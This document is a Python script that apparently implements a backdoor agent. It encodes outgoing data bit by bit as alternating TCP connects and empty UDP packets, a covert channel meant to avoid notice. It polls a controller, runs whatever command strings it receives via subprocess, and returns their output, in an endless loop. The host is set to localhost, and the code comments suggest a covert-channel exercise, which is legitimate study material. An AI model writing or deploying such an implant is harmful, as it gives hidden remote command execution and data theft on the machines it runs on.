import socket as Socket
import time
import subprocess

WAITTIME = 0.001
PORT = 1234
HOST = "127.0.0.1"

def build_socket(sockType):
    serverSock = Socket.socket(Socket.AF_INET,sockType)
    return serverSock


def convert_to_bits(toSend:str):
    bitsOut = ""
    for letter in toSend:
        bitsOut += format(ord(letter),"08b")
    return bitsOut


def send_traffic(message:str):
    udpSock = build_socket(Socket.SOCK_DGRAM)

    binaryToSend = convert_to_bits(message)
    for bit in binaryToSend:
        if int(bit) == 0: #Tcp connect
            tcpSock = build_socket(Socket.SOCK_STREAM)
            tcpSock.connect((HOST,PORT))
            tcpSock.send(b"")
            tcpSock.close()
            time.sleep(WAITTIME)
        else: #Udp connect
            udpSock.sendto(b"",(HOST,PORT))
            time.sleep(WAITTIME)
    time.sleep(0.5)
    udpSock.sendto(b"END",(HOST,PORT)) #TODO provide better end method.


def recv_traffic() -> str: #TODO improve this for better covert channels
    tcpSock = build_socket(Socket.SOCK_STREAM)
    time.sleep(0.2)
    tcpSock.connect((HOST,PORT))
    output = tcpSock.recv(1024).decode()
    tcpSock.close()
    return output


def handle_traffic(instructions:str):
    if instructions == "SLP": #No pending commands, check back later
        time.sleep(5)
        output = ""
    else: #Command received. Execute and return results
        instructionTokens = instructions.split(" ")
        output = subprocess.run(instructionTokens,capture_output=True).stdout.decode()
    return output


def main():
    toSend = "SHK"

    while True:
        send_traffic(toSend)
        toSend = handle_traffic(recv_traffic())


main()